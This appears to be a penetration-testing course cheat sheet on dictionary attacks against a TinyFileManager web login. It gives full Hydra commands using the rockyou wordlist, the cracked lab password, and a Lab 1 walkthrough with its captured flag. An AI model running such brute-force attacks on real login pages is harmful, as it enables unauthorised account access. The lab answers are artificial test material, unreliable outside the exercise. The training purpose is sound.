# HTTP POST Login Form

Login page of TinyFileManager
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/HTTP-POST-Login-Form-1.png)

Intercepted Login Request
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/HTTP-POST-Login-Form-2.png)

Intercepted Login Request (2)
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/HTTP-POST-Login-Form-3.png)

Successful Dictionary Attack on the Login Form
>``` shell
>kali@kali:~$ hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
>
># ========== Expected Result ==========
>...
>[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
>[DATA] attacking http-post-form://192.168.50.201:80/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid username or password
>[STATUS] 64.00 tries/min, 64 tries in 00:01h, 14344335 to do in 3735:31h, 16 active
>[80][http-post-form] host: 192.168.50.201   login: user   password: 121212
>1 of 1 target successfully completed, 1 valid password found
>...
># =====================================
>```

Successful Login
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/HTTP-POST-Login-Form-4.png)

Lab 1 - Follow the steps from this section to gain access to TinyFileManager on VM #1 (BRUTE). Once logged in, find the flag.
>``` shell
># Perform dictionary attack against web login
>kali@kali:~$ hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.243.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
>
># ========== Expected Result ==========
>...
>[80][http-post-form] host: 192.168.243.201   login: user   password: 121212
>1 of 1 target successfully completed, 1 valid password found
>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-22 12:55:09
># =====================================
>
># Navigate to http://192.168.243.201 (Target IP) and sign in with discovered credentials
>
># Open install.txt
>
># ========== Expected Result ==========
>Hola! Here is the secret API key - Don't share it
>OS{d3469592b23444bcb26a671ea9d3a65d}
># ====================================
>```
>OS{d3469592b23444bcb26a671ea9d3a65d}

Lab 2 - The web page on VM #2 is password protected. Use Hydra to perform a password attack and get access as user admin. Once you have identified the correct password, enter it as the answer to this exercise.
> 
